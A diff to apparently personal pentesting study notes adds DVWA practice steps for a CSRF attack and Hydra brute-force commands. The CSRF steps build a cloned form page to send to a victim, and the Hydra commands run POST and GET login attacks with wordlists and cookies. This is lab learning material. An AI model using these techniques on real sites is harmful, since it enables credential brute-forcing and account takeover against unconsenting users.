@@ -485,3 +485,35 @@ Points to remember:
 - The & can be interpreted by bash terminal as a special character. Escape it with \&.
 - Cookie session values can be manually grabbed from developer tools of web browser.
 	- --cookie='cookiename=cookievalue;.....'
+
+## CSRF (Cross site request forgery)
+
+#### Practice using DVWA. 
+
+- View page source of the CSRF page and locate the vulnerable form.
+- Copy the form
+- In apache2 /var/www/html/ make a file csrf.html
+- Paste the form and change the action to redirect to original csrf DVWA page. Also change the **value** in the password input fields to hacked password (new).
+- service apache2 start
+- visit localhost and visit csrf.html file
+
+*This page needs to be sent to victim.*
+
+
+To make the pages look similar copy all the original html and css code and change the form fields again.
+
+## Hydra Bruteforce Attack
+
+DVWA example:
+
+
+- POST (Login page of DVWA):
+
+	hydra *ip of target* http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&LOGIN=submit:Login failed" -L usernames.txt -P passwords.txt
+
+- GET (Brute force page of DVWA):
+
+	hydra *ip of target* http-form-get "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookies: *Get cookies value using burpsuite*" -L usernames.txt -P passwords.txt
+
+
+If Hydra doesn't work it may mean enough fields have not been specified. For example, the cookie value.
